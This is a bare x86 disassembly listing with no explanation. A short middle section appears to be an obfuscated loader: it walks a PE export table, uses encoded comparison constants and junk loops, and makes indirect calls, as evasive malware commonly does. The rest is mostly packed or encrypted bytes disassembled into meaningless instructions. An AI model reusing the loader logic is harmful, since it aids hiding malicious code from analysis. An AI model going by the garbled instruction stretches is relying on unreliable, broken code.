  40ca37:	xchg   BYTE PTR [ecx+0x6d66c9c0],al
  40ca3d:	cld    
  40ca3e:	setle  BYTE PTR [ebx]
  40ca41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca42:	xor    eax,0xb519e581
  40ca47:	xor    esp,DWORD PTR [edx]
  40ca49:	mov    dh,0x8e
  40ca4b:	xor    al,0x9
  40ca4d:	xchg   esi,eax
  40ca4e:	push   edi
  40ca4f:	and    BYTE PTR [eax],0x3f
  40ca52:	push   esp
  40ca53:	rcl    BYTE PTR [ebx+0x4a],0xb1
  40ca57:	mov    al,ds:0x4f2a66f4
  40ca5c:	call   FWORD PTR [edi]
  40ca5e:	call   0xfd0c4823
  40ca63:	mov    esi,0x7e93b0a3
  40ca68:	mov    ch,0x75
  40ca6a:	pop    edx
  40ca6b:	xchg   ecx,eax
  40ca6c:	lods   al,BYTE PTR ds:[esi]
  40ca6d:	sti    
  40ca6e:	jb     0x40ca8c
  40ca70:	inc    ecx
  40ca71:	pop    es
  40ca72:	and    esp,ebx
  40ca74:	js     0x40caf2
  40ca76:	sub    BYTE PTR ds:0x1ffc779a,ch
  40ca7c:	in     al,dx
  40ca7d:	lods   al,BYTE PTR ds:[esi]
  40ca7e:	fs pop esp
  40ca80:	nop
  40ca81:	mov    edx,0xed2e50d1
  40ca86:	or     eax,0xc9c1c7e9
  40ca8b:	and    BYTE PTR [ecx+eax*4],0xf3
  40ca8f:	int3   
  40ca90:	mov    eax,0xf6339d96
  40ca96:	call   0x33f5:0x3a775ed1
  40ca9d:	into   
  40ca9e:	into   
  40ca9f:	sbb    eax,0xe4ed9b0f
  40caa4:	in     al,dx
  40caa5:	jge    0x40cad5
  40caa7:	mov    esi,0x8c50b2db
  40caac:	mov    edi,DWORD PTR [ecx]
  40caae:	add    DWORD PTR [eax],ebx
  40cab0:	mov    eax,DWORD PTR [ebp-0x4]
  40cab3:	mov    edi,DWORD PTR [ebp-0x8]
  40cab6:	add    edi,DWORD PTR [eax]
  40cab8:	mov    DWORD PTR [ebp-0x8],edi
  40cabb:	mov    eax,DWORD PTR [ebp+0xc]
  40cabe:	mov    edi,DWORD PTR [ebp+0xc]
  40cac1:	xor    edi,ecx
  40cac3:	xor    eax,ecx
  40cac5:	lea    eax,[eax+edi*1+0x64e5ba]
  40cacc:	mov    edi,DWORD PTR [ebp+0xc]
  40cacf:	xor    edi,ecx
  40cad1:	add    edi,edx
  40cad3:	imul   eax,edi
  40cad6:	mov    edi,DWORD PTR [ebp+0xc]
  40cad9:	xor    edi,ecx
  40cadb:	sub    edi,eax
  40cadd:	mov    eax,DWORD PTR [ebp-0x4]
  40cae0:	add    edi,edx
  40cae2:	cmp    DWORD PTR [eax],edi
  40cae4:	mov    eax,DWORD PTR [ebp-0x4]
  40cae7:	mov    edi,DWORD PTR [ebp+0x10]
  40caea:	jg     0x40cafd
  40caf0:	xor    edi,ecx
  40caf2:	mov    ebx,esi
  40caf4:	sub    ebx,edi
  40caf6:	add    DWORD PTR [eax],ebx
  40caf8:	jmp    0x40cb03
  40cafd:	xor    edi,ecx
  40caff:	add    edi,edx
  40cb01:	add    DWORD PTR [eax],edi
  40cb03:	mov    eax,DWORD PTR [ebp-0x8]
  40cb06:	mov    edi,DWORD PTR [ebp-0x10]
  40cb09:	mov    eax,DWORD PTR [eax]
  40cb0b:	xor    edi,ecx
  40cb0d:	add    edi,0x3272dc
  40cb13:	not    edi
  40cb15:	and    eax,edi
  40cb17:	movsx  di,BYTE PTR [eax+0x1]
  40cb1c:	mov    ebx,0x3b4c
  40cb21:	sub    di,bx
  40cb24:	mov    ebx,0x8a89
  40cb29:	xor    di,bx
  40cb2c:	mov    ebx,0x4f87
  40cb31:	cmp    di,bx
  40cb34:	jne    0x40cb5c
  40cb3a:	movsx  di,BYTE PTR [eax]
  40cb3e:	mov    ebx,0x3b4c
  40cb43:	sub    di,bx
  40cb46:	mov    ebx,0x8a89
  40cb4b:	xor    di,bx
  40cb4e:	mov    ebx,0x4f88
  40cb53:	cmp    di,bx
  40cb56:	je     0x40cb6c
  40cb5c:	mov    edi,DWORD PTR [ebp-0x10]
  40cb5f:	xor    edi,ecx
  40cb61:	mov    ebx,esi
  40cb63:	sub    ebx,edi
  40cb65:	add    eax,ebx
  40cb67:	jmp    0x40cb17
  40cb6c:	mov    esi,DWORD PTR [ebp-0x14]
  40cb6f:	mov    esi,DWORD PTR [esi]
  40cb71:	mov    edi,DWORD PTR [eax+0x3c]
  40cb74:	lea    esi,[edi+esi*8+0x78]
  40cb78:	mov    esi,DWORD PTR [esi+eax*1]
  40cb7b:	mov    DWORD PTR [ebp-0x8],esi
  40cb7e:	mov    esi,DWORD PTR [ebp+0x8]
  40cb81:	xor    esi,ecx
  40cb83:	add    esi,edx
  40cb85:	mov    DWORD PTR [ebp-0x14],esi
  40cb88:	mov    esi,DWORD PTR [ebp+0x8]
  40cb8b:	mov    edi,DWORD PTR [ebp-0x8]
  40cb8e:	xor    esi,ecx
  40cb90:	add    esi,edx
  40cb92:	pop    ebx
  40cb93:	cmp    edi,esi
  40cb95:	jne    0x40cbb3
  40cb9b:	mov    eax,DWORD PTR [ebp+0xc]
  40cb9e:	xor    eax,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cba3:	add    eax,edx
  40cba5:	imul   eax,ecx
  40cba8:	mov    DWORD PTR [ebp-0x8],eax
  40cbab:	push   DWORD PTR [ebp+0x18]
  40cbae:	jmp    0x40cc07
  40cbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbb6:	add    ecx,eax
  40cbb8:	mov    DWORD PTR [ebp-0x14],ecx
  40cbbb:	mov    ecx,DWORD PTR [ebp-0x14]
  40cbbe:	mov    ecx,DWORD PTR [ecx+0xc]
  40cbc1:	movsx  cx,BYTE PTR [ecx+eax*1]
  40cbc6:	mov    edx,0x3b4c
  40cbcb:	sub    cx,dx
  40cbce:	mov    edx,0x8a89
  40cbd3:	xor    cx,dx
  40cbd6:	mov    edx,0x4e76
  40cbdb:	cmp    cx,dx
  40cbde:	jne    0x40cbab
  40cbe4:	mov    ecx,DWORD PTR ds:0x42e435
  40cbea:	mov    ecx,DWORD PTR [ecx+0x198]
  40cbf0:	mov    DWORD PTR [ecx],eax
  40cbf2:	jmp    0x40cc18
  40cbf7:	mov    ecx,DWORD PTR [ebp+0x18]
  40cbfa:	cmp    ecx,0xf89c85b2
  40cc00:	jne    0x40cc18
  40cc06:	push   eax
  40cc07:	push   DWORD PTR [ebp+0x14]
  40cc0a:	push   DWORD PTR [ebp+0x10]
  40cc0d:	push   DWORD PTR [ebp+0xc]
  40cc10:	push   DWORD PTR [ebp+0x8]
  40cc13:	call   0x40a327
  40cc18:	pop    edi
  40cc19:	pop    esi
  40cc1a:	leave  
  40cc1b:	ret    0x14
  40cc1e:	push   ebp
  40cc1f:	mov    ebp,esp
  40cc21:	push   ecx
  40cc22:	push   ecx
  40cc23:	add    DWORD PTR ds:0x42b010,edx
  40cc29:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  40cc30:	sub    DWORD PTR ds:0x429024,0x76a8
  40cc3a:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  40cc41:	and    DWORD PTR ds:0x42b018,edi
  40cc47:	mov    eax,DWORD PTR [ebp-0x4]
  40cc4a:	adc    DWORD PTR ds:0x429018,edx
  40cc50:	push   esi
  40cc51:	and    DWORD PTR ds:0x42a000,0x0
  40cc5b:	jmp    0x40cc6d
  40cc60:	mov    esi,DWORD PTR ds:0x42a000
  40cc66:	inc    esi
  40cc67:	mov    DWORD PTR ds:0x42a000,esi
  40cc6d:	cmp    DWORD PTR ds:0x42a000,0x1a
  40cc74:	jae    0x40cc98
  40cc7a:	cmp    DWORD PTR ds:0x42a000,0x26
  40cc81:	jne    0x40cc8d
  40cc87:	call   DWORD PTR ds:0x42ed51
  40cc8d:	jmp    0x40cc60
  40cc92:	sub    edx,0x54cb
  40cc98:	mov    esi,DWORD PTR [ebp-0x8]
  40cc9b:	and    DWORD PTR ds:0x429018,0x0
  40cca5:	jmp    0x40ccb7
  40ccaa:	mov    ecx,DWORD PTR ds:0x429018
  40ccb0:	inc    ecx
  40ccb1:	mov    DWORD PTR ds:0x429018,ecx
  40ccb7:	cmp    DWORD PTR ds:0x429018,0x1e
  40ccbe:	jae    0x40ccf6
  40ccc4:	cmp    DWORD PTR ds:0x429018,0x8
  40cccb:	jne    0x40ccd7
  40ccd1:	call   DWORD PTR ds:0x42ed55
  40ccd7:	cmp    DWORD PTR ds:0x429018,0x7
  40ccde:	jne    0x40ccf1
  40cce4:	mov    ecx,DWORD PTR ds:0x429018
  40ccea:	inc    ecx
  40cceb:	mov    DWORD PTR ds:0x429018,ecx
  40ccf1:	jmp    0x40ccaa
  40ccf6:	mov    edx,0x7510896
  40ccfb:	mov    ecx,DWORD PTR ds:0x42d00c
  40cd01:	sub    DWORD PTR ds:0x42a004,ecx
  40cd07:	xor    eax,edx
  40cd09:	xor    esi,edx
  40cd0b:	mov    DWORD PTR ds:0x42b00c,0x13
  40cd15:	cmp    DWORD PTR ds:0x42b00c,0x0
  40cd1c:	je     0x40cd7c
  40cd22:	cmp    DWORD PTR ds:0x42b00c,0x2
  40cd29:	jne    0x40cd50
  40cd2f:	push   DWORD PTR [ebp-0x14]
  40cd32:	push   0x6af7
  40cd37:	push   0x42b010
  40cd3c:	push   0x84d2
  40cd41:	push   DWORD PTR [ebp-0x10]
  40cd44:	push   DWORD PTR [ebp-0x20]
  40cd47:	push   DWORD PTR [ebp-0x28]
  40cd4a:	call   DWORD PTR ds:0x42ed59
  40cd50:	cmp    DWORD PTR ds:0x42b00c,0x3
  40cd57:	jne    0x40cd6a
  40cd5d:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd63:	dec    ecx
  40cd64:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd6a:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd70:	dec    ecx
  40cd71:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd77:	jmp    0x40cd15
  40cd7c:	mov    ecx,0x3272dd
  40cd81:	add    esi,ecx
  40cd83:	add    eax,ecx
  40cd85:	imul   eax,esi
  40cd88:	mov    esi,DWORD PTR [ebp+0xc]
  40cd8b:	cmp    esi,eax
  40cd8d:	jne    0x40cda9
  40cd93:	mov    eax,DWORD PTR [ebp-0x4]
  40cd96:	mov    esi,DWORD PTR [ebp-0x8]
  40cd99:	xor    eax,edx
  40cd9b:	xor    esi,edx
  40cd9d:	add    eax,ecx
  40cd9f:	add    esi,ecx
  40cda1:	imul   eax,esi
  40cda4:	jmp    0x40f15e
  40cda9:	mov    eax,DWORD PTR [ebp+0xc]
  40cdac:	mov    eax,DWORD PTR [eax+0x78]
  40cdaf:	mov    DWORD PTR [ebp+0xc],eax
  40cdb2:	mov    eax,DWORD PTR [ebp-0x4]
  40cdb5:	mov    esi,DWORD PTR [ebp-0x8]
  40cdb8:	xor    eax,edx
  40cdba:	xor    esi,edx
  40cdbc:	add    eax,ecx
  40cdbe:	add    esi,ecx
  40cdc0:	imul   eax,esi
  40cdc3:	jmp    0x40f13d
  40cdc8:	push   esi
  40cdc9:	pop    ss
  40cdca:	rcl    DWORD PTR [ebx-0x6d],cl
  40cdcd:	fwait
  40cdce:	(bad)  
  40cdcf:	pop    ss
  40cdd0:	push   ds
  40cdd1:	outs   dx,BYTE PTR ds:[esi]
  40cdd2:	adc    DWORD PTR ds:0x25d5be73,ebx
  40cdd8:	fldl2t 
  40cdda:	jp     0x40ce56
  40cddc:	sbb    DWORD PTR [edi+0x7a],ebx
  40cddf:	jp     0x40cd9c
  40cde1:	sbb    al,0xde
  40cde3:	xchg   DWORD PTR [eax+0x65],edi
  40cde6:	adc    al,0x78
  40cde8:	mov    ds:0xaeeacf,eax
  40cded:	xor    DWORD PTR [edx+0x25],ebp
  40cdf0:	fcomp  DWORD PTR [edx-0x1bd9513f]
  40cdf6:	jp     0x40cdfa
  40cdf8:	push   esp
  40cdf9:	sub    ecx,esp
  40cdfb:	adc    ecx,ebp
  40cdfd:	sbb    eax,0xf07bef3c
  40ce02:	pusha  
  40ce03:	add    edi,DWORD PTR [ebx+0x22]
  40ce06:	inc    esi
  40ce07:	inc    ebx
  40ce08:	push   ds
  40ce09:	leave  
  40ce0a:	pusha  
  40ce0b:	or     al,0x14
  40ce0d:	pop    ecx
  40ce0e:	lods   al,BYTE PTR ds:[esi]
  40ce0f:	imul   esi,DWORD PTR [ebp+esi*2+0x50],0xffffff85
  40ce14:	daa    
  40ce15:	out    0x76,al
  40ce17:	pop    esi
  40ce18:	inc    esi
  40ce19:	cmp    DWORD PTR [eax-0x3d],ebp
  40ce1c:	popf   
  40ce1d:	mov    esi,0x17426de6
  40ce22:	adc    edx,DWORD PTR [eax]
  40ce24:	leave  
  40ce25:	popf   
  40ce26:	xchg   ebx,eax
  40ce27:	inc    eax
  40ce28:	popa   
  40ce29:	(bad)  [edx]
  40ce2b:	jge    0x40cea4
  40ce2d:	outs   dx,BYTE PTR ds:[esi]
  40ce2e:	enter  0x7ff8,0xd9
  40ce32:	fmul   QWORD PTR [ecx+0x38b11991]
  40ce38:	xor    DWORD PTR [ebp+0x14872337],0x0
  40ce3f:	ja     0x40cdd9
  40ce41:	push   cs
  40ce42:	jo     0x40ce4c
  40ce44:	jecxz  0x40ceac
  40ce46:	dec    ebx
  40ce47:	sub    eax,DWORD PTR [ecx]
  40ce49:	fwait
  40ce4a:	xor    al,0x74
  40ce4c:	and    DWORD PTR [edx+edx*4],ebx
  40ce4f:	mov    edx,DWORD PTR [eax-0x2]
  40ce52:	dec    ax
  40ce54:	das    
  40ce55:	inc    eax
  40ce56:	push   0x27
  40ce58:	cmp    eax,0x76c106f8
  40ce5d:	or     eax,0x18d60594
  40ce62:	adc    dh,dh
  40ce64:	mov    cl,0xde
  40ce66:	jp     0x40ce09
  40ce68:	cmp    eax,0x6ee042cb
  40ce6d:	mov    WORD PTR [eax-0xc],?
  40ce70:	sub    ebp,edi
  40ce72:	int3   
  40ce73:	adc    edi,DWORD PTR [ebp-0x32]
  40ce76:	mov    BYTE PTR [esi],bl
  40ce78:	sahf   
  40ce79:	mov    bh,0xe1
  40ce7b:	out    0x91,eax
  40ce7d:	lock add al,0x42
  40ce80:	loopne 0x40ce0b
  40ce82:	fisttp QWORD PTR [ebp+0x40]
  40ce85:	int3   
  40ce86:	pop    es
  40ce87:	inc    edi
  40ce88:	int    0x97
  40ce8a:	xchg   ch,dh
  40ce8c:	ins    BYTE PTR es:[edi],dx
  40ce8d:	adc    edx,DWORD PTR [esi-0x4c9cb980]
  40ce93:	xchg   ecx,eax
  40ce94:	fnstenv ds:0x873c9568
  40ce9a:	fs jae 0x40ceba
  40ce9d:	push   ss
  40ce9e:	sub    eax,0x69f952d6
  40cea3:	jo     0x40ceeb
  40cea5:	adc    eax,0x46d3e9d4
  40ceaa:	xor    ebp,DWORD PTR [eax-0x3c1c1a57]
  40ceb0:	shl    DWORD PTR [edx-0x32],cl
  40ceb3:	mov    al,ds:0xa48ac937
  40ceb8:	xchg   ebp,eax
  40ceb9:	dec    ebp
  40ceba:	nop
  40cebb:	ror    BYTE PTR [edx-0x33],1
  40cebe:	push   cs
  40cebf:	and    eax,0xc29208cf
  40cec4:	(bad)  
  40cec5:	or     esp,DWORD PTR [edx+0x34]
  40cec8:	sub    BYTE PTR [edx+0xd],bl
  40cecb:	sub    DWORD PTR [eax+ecx*8],esp
  40cece:	loope  0x40cea9
  40ced0:	shr    bl,0x4f
  40ced3:	loopne 0x40cee6
  40ced5:	and    DWORD PTR [edx+esi*2-0x65],esp
  40ced9:	ins    BYTE PTR es:[edi],dx
  40ceda:	adc    BYTE PTR [edx+edx*8],cl
  40cedd:	aad    0x36
  40cedf:	leave  
  40cee0:	lods   eax,DWORD PTR ds:[esi]
  40cee1:	adc    DWORD PTR [eax+ebp*8],esi
  40cee4:	jmp    0x40cef7
  40cee6:	pop    ss
  40cee7:	loop   0x40cf61
  40cee9:	sar    DWORD PTR [ecx-0x4b5898ec],1
  40ceef:	xchg   esi,eax
  40cef0:	xchg   ebx,eax
  40cef1:	xor    al,0x84
  40cef3:	cmp    eax,0x6176b3d0
  40cef8:	mov    ds:0x6ad96c1f,eax
  40cefd:	push   edx
  40cefe:	jl     0x40ce8f
  40cf00:	pop    ds
  40cf01:	data16 fwait
  40cf03:	mov    ah,0xdc
  40cf05:	ins    BYTE PTR es:[edi],dx
  40cf06:	pop    esp
  40cf07:	or     al,0xb6
  40cf09:	sbb    bh,BYTE PTR [edi]
  40cf0b:	xor    eax,DWORD PTR [ebp+0x8]
  40cf0e:	aaa    
  40cf0f:	mov    ecx,0xd0176ed1
  40cf14:	jns    0x40cefe
  40cf16:	push   ebx
  40cf17:	xchg   ecx,eax
  40cf18:	pop    edi
  40cf19:	xchg   esp,eax
  40cf1a:	mov    bh,bh
  40cf1c:	pop    es
  40cf1d:	pop    es
  40cf1e:	dec    ebx
  40cf1f:	add    al,0x43
  40cf21:	lahf   
  40cf22:	jnp    0x40cf31
  40cf24:	cld    
  40cf25:	pushf  
  40cf26:	rcr    esp,cl
  40cf28:	loope  0x40ceba
  40cf2a:	cmp    eax,0x2eeecc98
  40cf2f:	dec    edi
  40cf30:	ja     0x40cf06
  40cf32:	push   0x19d79fc7
  40cf37:	jl     0x40cf55
  40cf39:	stos   BYTE PTR es:[edi],al
  40cf3a:	rcr    DWORD PTR [eax-0x43],0xde
  40cf3e:	and    BYTE PTR [ecx],0xee
  40cf41:	add    eax,0x9ca64f9e
  40cf46:	cmp    DWORD PTR [edx-0x1df3dc7f],ebp
  40cf4c:	inc    edi
  40cf4d:	sub    BYTE PTR ss:[ebx+0x7b5be96f],ch
  40cf54:	scas   eax,DWORD PTR es:[edi]
  40cf55:	xchg   esi,eax
  40cf56:	pushf  
  40cf57:	stos   DWORD PTR es:[edi],eax
  40cf58:	xchg   ebx,eax
  40cf59:	(bad)  
  40cf5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf5b:	rcl    BYTE PTR [ecx+0x50abe146],0xa8
  40cf62:	mov    ?,edx
  40cf64:	mov    edi,DWORD PTR [esp+ebp*1+0x70]
  40cf68:	retf   0x34b5
  40cf6b:	mov    eax,ds:0x4a21d14b
  40cf70:	mov    dl,0xde
  40cf72:	dec    eax
  40cf73:	inc    esi
  40cf74:	ins    BYTE PTR es:[edi],dx
  40cf75:	aaa    
  40cf76:	push   esi
  40cf77:	pop    esi
  40cf78:	repz add bl,BYTE PTR ds:0x59af1966
  40cf7f:	jno    0x40cf4a
  40cf81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf82:	inc    ecx
  40cf83:	mov    WORD PTR [ebp-0x664f14ef],ds
  40cf89:	xchg   ecx,eax
  40cf8a:	fcmovu st,st(0)
  40cf8c:	addr16 mov ecx,0xd99e9234
  40cf92:	fisubr WORD PTR [eax-0x6c]
  40cf95:	bound  eax,QWORD PTR [eax-0x3]
  40cf98:	cmc    
  40cf99:	push   ds
  40cf9a:	lods   eax,DWORD PTR ds:[esi]
  40cf9b:	test   BYTE PTR [ebp+0x3ed1267d],dh
  40cfa1:	test   esi,eax
  40cfa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfa4:	jmp    0xc4454010
  40cfa9:	scas   eax,DWORD PTR es:[edi]
  40cfaa:	repz dec ebx
  40cfac:	push   0x3a
  40cfae:	sahf   
  40cfaf:	mov    eax,DWORD PTR [ecx+esi*2-0x7d]
  40cfb3:	push   ebx
  40cfb4:	mov    dh,0x8
  40cfb6:	clc    
  40cfb7:	sbb    DWORD PTR [ebx-0x77e54716],0xa079ca72
  40cfc1:	jmp    0x40cfa2
  40cfc3:	sbb    al,0x2b
  40cfc5:	dec    ebx
  40cfc6:	fwait
  40cfc7:	pop    ds
  40cfc8:	mov    edx,0x218a553f
  40cfcd:	int3   
  40cfce:	add    ch,BYTE PTR [esi]
  40cfd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfd1:	pusha  
  40cfd2:	ds shl eax,0x5c
  40cfd6:	rcr    al,0xbb
  40cfd9:	sbb    DWORD PTR [ebp-0x11cba6f3],eax
  40cfdf:	les    ebx,FWORD PTR [ebp+0x3ea2d4f2]
  40cfe5:	sbb    al,0x8
  40cfe7:	and    ah,bh
  40cfe9:	push   ss
  40cfea:	cld    
  40cfeb:	add    dh,bl
  40cfed:	and    eax,0x40f325b6
  40cff2:	mov    cl,0xd7
  40cff4:	xor    eax,0xa0aa2271
  40cff9:	mov    esi,0x187c15be
  40cffe:	or     edi,DWORD PTR [eax-0x6d]
  40d001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d002:	sub    BYTE PTR [eax],dh
  40d004:	in     eax,dx
  40d005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d006:	mov    esp,0xab4806bf
  40d00b:	push   edi
  40d00c:	mov    esp,0x61fc29b5
  40d011:	push   edi
  40d012:	lods   eax,DWORD PTR ds:[esi]
  40d013:	jmp    0xb921:0x1b9bc07e
  40d01a:	int    0x77
  40d01c:	fwait
  40d01d:	in     al,0x6d
  40d01f:	fcomp  DWORD PTR [ebx+0x65a3ffd2]
  40d025:	loop   0x40d05e
  40d027:	imul   eax,ebx,0x5c
  40d02a:	dec    esp
  40d02b:	xchg   ebx,eax
  40d02c:	dec    ebx
  40d02d:	jp     0x40cfc8
  40d02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d030:	into   
  40d031:	sbb    bl,cl
  40d033:	pop    eax
  40d034:	rol    BYTE PTR [edi+0x730cb953],1
  40d03a:	hlt    
  40d03b:	push   ebx
  40d03c:	nop
  40d03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d03e:	sbb    eax,0x1e78d64c
  40d043:	in     eax,dx
  40d044:	(bad)
  40d047:	daa    
  40d048:	out    dx,eax
  40d049:	jp     0x40d08c
  40d04b:	lds    esi,FWORD PTR [eax-0x18]
  40d04e:	dec    ecx
  40d04f:	mov    ebp,0x8232a23b
  40d054:	jmp    0x28ffccdd
  40d059:	add    eax,DWORD PTR [esi]
  40d05b:	pop    ebx
  40d05c:	xor    BYTE PTR [eax],cl
  40d05e:	rcr    DWORD PTR [edx-0x1c],1
  40d061:	dec    ecx
  40d062:	(bad)  
  40d063:	dec    edi
  40d064:	ror    DWORD PTR [eax],1
  40d066:	xchg   BYTE PTR [esi],bl
  40d068:	jp     0x40d05b
  40d06a:	out    dx,al
  40d06b:	pop    ecx
  40d06c:	sub    dl,BYTE PTR ds:0x9004c933
  40d072:	btc    DWORD PTR [edx],0x5
  40d076:	xchg   edx,eax
  40d077:	popf   
  40d078:	mov    ds:0x6bcc26d7,al
  40d07d:	push   cs
  40d07e:	or     ebp,edi
  40d080:	sbb    al,0x4a
  40d082:	enter  0x9a1e,0x14
  40d086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d087:	cmp    eax,0xe5abdd3c
  40d08c:	xor    al,0xbb
  40d08e:	push   edx
  40d08f:	mov    bh,0xab
  40d091:	inc    edx
  40d092:	sbb    DWORD PTR [ebp-0x1d88cc01],ebx
  40d098:	pop    ecx
  40d099:	adc    esp,ecx
  40d09b:	sub    ah,BYTE PTR [esi-0x28f03613]
  40d0a1:	sub    BYTE PTR [edi+ebx*4+0x3e],bh
  40d0a5:	hlt    
  40d0a6:	cs fwait
  40d0a8:	inc    esi
  40d0a9:	sub    edx,esp
  40d0ab:	sahf   
  40d0ac:	mov    eax,0x663ba550
  40d0b1:	outs   dx,BYTE PTR ds:[esi]
  40d0b2:	mov    dl,0xeb
  40d0b4:	and    al,0xdd
  40d0b6:	loop   0x40d120
  40d0b8:	data16 jo 0x40d046
  40d0bb:	rep lods al,BYTE PTR ds:[esi]
  40d0bd:	fiadd  WORD PTR [edi]
  40d0bf:	jmp    0x3ac034bc
  40d0c4:	and    eax,0x3fc5ca07
  40d0c9:	ins    DWORD PTR es:[edi],dx
  40d0ca:	(bad)  
  40d0cb:	push   ebx
  40d0cc:	and    ecx,edx
  40d0ce:	ss pusha 
  40d0d0:	cld    
  40d0d1:	fstp   TBYTE PTR [ecx-0x7f717370]
  40d0d7:	sub    edx,ebx
  40d0d9:	fisttp WORD PTR [esi]
  40d0db:	jl     0x40d148
  40d0dd:	ds out 0x86,al
  40d0e0:	xchg   ebp,eax
  40d0e1:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d0e3:	push   edi
  40d0e4:	jl     0x40d090
  40d0e6:	scas   al,BYTE PTR es:[edi]
  40d0e7:	retf   0xeb3b
  40d0ea:	fild   QWORD PTR [edi]
  40d0ec:	adc    BYTE PTR [ecx+ecx*8+0x5d],0x8b
  40d0f1:	push   edx
  40d0f2:	inc    edi
  40d0f3:	jmp    0x38c532a1
  40d0f8:	gs inc esp
  40d0fa:	mov    ebx,0x75cc07b7
  40d0ff:	test   eax,0xdc4e3582
  40d104:	push   ecx
  40d105:	lods   al,BYTE PTR ds:[esi]
  40d106:	leave  
  40d107:	sahf   
  40d108:	mov    dh,0x7
  40d10a:	or     cl,BYTE PTR [edx]
  40d10c:	adc    DWORD PTR [esi-0x8febe0b],edi
  40d112:	dec    eax
  40d113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d114:	mov    ebp,0xf568da35
  40d119:	xchg   esp,eax
  40d11a:	jg     0x40d108
  40d11c:	mov    ah,0xa9
  40d11e:	int3   
  40d11f:	jmp    0x9690:0xe45806c9
  40d126:	dec    ebx
  40d127:	mov    ds:0x79b4af5b,eax
  40d12c:	test   al,0x69
  40d12e:	jecxz  0x40d199
  40d130:	pop    ss
  40d131:	imul   ebp,esp,0xce0241db
  40d137:	xor    eax,DWORD PTR [ebp+ecx*1-0x50]
  40d13b:	shl    BYTE PTR [edi+0xb],cl
  40d13e:	sti    
  40d13f:	sub    ebp,DWORD PTR ds:0xdbaa769b
  40d145:	not    BYTE PTR [ebx+0x6650e833]
  40d14b:	enter  0xebdc,0x69
  40d14f:	fmul   QWORD PTR [eax-0x1d]
  40d152:	mov    ebp,edi
  40d154:	shl    DWORD PTR [ebp+0x9],1
  40d157:	out    0x68,eax
  40d159:	sub    eax,0x271d90e
  40d15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d15f:	je     0x40d0fb
  40d161:	push   es
  40d162:	xchg   DWORD PTR [ecx+0x44],eax
  40d165:	push   ecx
  40d166:	mov    BYTE PTR [edi],bh
  40d168:	(bad)  
  40d169:	out    dx,eax
  40d16a:	add    edx,ecx
  40d16c:	imul   esp,esi,0x49
  40d16f:	xchg   edi,eax
  40d170:	test   DWORD PTR [edi],ebx
  40d172:	and    dl,BYTE PTR [ebp+0x4523d914]
  40d178:	mov    esp,0xcea2eab
  40d17d:	les    ebp,FWORD PTR [edx+0x85e8786]
  40d183:	aaa    
  40d184:	inc    esp
  40d185:	or     eax,0xc8fe8a24
  40d18a:	push   edi
  40d18b:	loop   0x40d121
  40d18d:	out    dx,eax
  40d18e:	mov    ch,0x8b
  40d190:	mov    WORD PTR [edx+0x7bb9157a],ds
  40d196:	xchg   edi,eax
  40d197:	and    BYTE PTR [ebp+0x6a4cdd3e],dh
  40d19d:	outs   dx,BYTE PTR ds:[esi]
  40d19e:	mov    eax,0x5bf2aaaf
  40d1a3:	cld    
  40d1a4:	push   DWORD PTR [ebx+0x60]
  40d1a7:	or     eax,0x92d41465
  40d1ac:	(bad)
  40d1af:	push   esi
  40d1b0:	dec    ebx
  40d1b1:	sbb    bh,BYTE PTR [ebp-0x7c]
  40d1b4:	jmp    0x68b986a8
  40d1b9:	or     BYTE PTR [edx+0x7a],dl
  40d1bc:	cmc    
  40d1bd:	and    BYTE PTR [ebx-0x54c5de0f],ch
  40d1c3:	dec    ebx
  40d1c4:	xor    DWORD PTR [edx],ebp
  40d1c6:	retf   0x6fd9
  40d1c9:	xchg   esi,eax
  40d1ca:	out    dx,eax
  40d1cb:	xor    al,0xdc
  40d1cd:	cdq    
  40d1ce:	fwait
  40d1cf:	and    DWORD PTR [ecx],edx
  40d1d1:	mov    al,ds:0x39bbb83a
  40d1d6:	cmc    
  40d1d7:	dec    edx
  40d1d8:	add    ebx,DWORD PTR [ebx]
  40d1da:	test   eax,0xdad03827
  40d1df:	arpl   bp,si
  40d1e1:	scas   al,BYTE PTR es:[edi]
  40d1e2:	xchg   edi,eax
  40d1e3:	cmp    eax,0xcf03ceaf
  40d1e8:	adc    al,0xd
  40d1ea:	call   0x2f6e:0xbbff5a5f
  40d1f1:	pop    edi
  40d1f2:	imul   esp,eax,0xfffffffa
  40d1f5:	xchg   BYTE PTR [ebx],bh
  40d1f7:	nop
  40d1f8:	sub    DWORD PTR ds:0xf4ca327b,ecx
  40d1fe:	fadd   DWORD PTR ds:[eax+0x27]
  40d202:	inc    ecx
  40d203:	jb     0x40d223
  40d205:	cli    
  40d206:	push   ebx
  40d207:	aas    
  40d208:	inc    ebx
  40d209:	jg     0x40d1a8
  40d20b:	bound  esp,QWORD PTR [ecx-0x33]
  40d20e:	xchg   edi,eax
  40d20f:	pop    ecx
  40d210:	popa   
  40d211:	push   esi
  40d212:	and    bh,BYTE PTR [eax-0x3c]
  40d215:	jge    0x40d1f7
  40d217:	pushf  
  40d218:	ror    BYTE PTR [ecx+0x31bb35d],cl
  40d21e:	add    eax,0xde6639a8
  40d223:	push   edx
  40d224:	hlt    
  40d225:	or     ecx,DWORD PTR [edx-0x3b8d6617]
  40d22b:	sbb    DWORD PTR [ecx],ebx
  40d22d:	mov    eax,ds:0x907a97cd
